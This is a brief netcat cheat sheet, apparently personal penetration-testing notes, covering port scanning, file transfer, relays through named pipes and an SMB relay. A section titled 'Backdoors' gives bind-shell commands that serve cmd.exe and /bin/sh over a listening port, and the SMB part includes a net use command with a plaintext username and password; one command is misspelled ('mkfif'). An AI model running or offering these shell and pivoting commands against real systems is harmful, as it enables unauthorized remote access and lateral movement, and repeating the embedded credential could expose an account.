### NC Scanning
nc -v -w3 -z <ip> <ports>

## Data Transfer (Listener to client)
### Client
nc -nlvp 8000 < yeet.txt
### Server 
nc 127.0.0.1 8000 > yeet.txt & 
## Data Tramsfer (Client to Listener)
### Client 
nc -nlvp 8000 > yeet.txt
### Server 
nc 127.0.0.1 8000 < yeet.txt 

## Backdoors
nc -nlvp 8000 -e cmd.exe
nc -nlvp 8000 -e /bin/sh

## Relays
### Client
nc 10.10.10.10 2222 
### Relay Device/Listener 
nc -nlvp 2222 | nc 10.10.10.100 80 

### Relay with HTTP 
mkfifo namedpipe
nc -l -p 8080 < namedpipe | nc 172.30.0.55 80 > namedpipe
curl http://172.30.0.50:8080



### Relay with SMB 
mkfif namedpipe
sudo nc -l -p 445 < namedpipe | nc 172.30.0.22 445 > namedpipe
net use * \\10.10.75.1\data /u:erigby weddingrice
net use
Z:

